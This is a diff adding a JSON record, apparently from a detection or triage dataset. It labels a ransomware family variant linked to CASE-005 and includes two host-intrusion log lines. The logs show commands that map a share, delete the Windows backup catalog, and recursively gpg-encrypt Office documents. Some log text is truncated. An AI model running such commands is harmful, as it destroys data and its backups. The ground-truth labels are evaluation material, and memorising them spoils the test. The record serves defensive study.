@@ -1,0 +1,33 @@
+{
+ "unit": 1087,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "挂载共享盘并删除编录后用 gpg 递归批量加密 Office 文档",
+ "sources": [
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-25 03:37:40",
+   "source": "hids",
+   "log_id": "HID0618447",
+   "content": "net use Z: \\\\10.20.4.88\\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== s",
+   "event_id": "1087-HID0618447"
+  },
+  {
+   "timestamp": "2026-07-25 03:40:05",
+   "source": "hids",
+   "log_id": "HID0618460",
+   "content": "for /r Z:\\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /",
+   "event_id": "1087-HID0618460"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
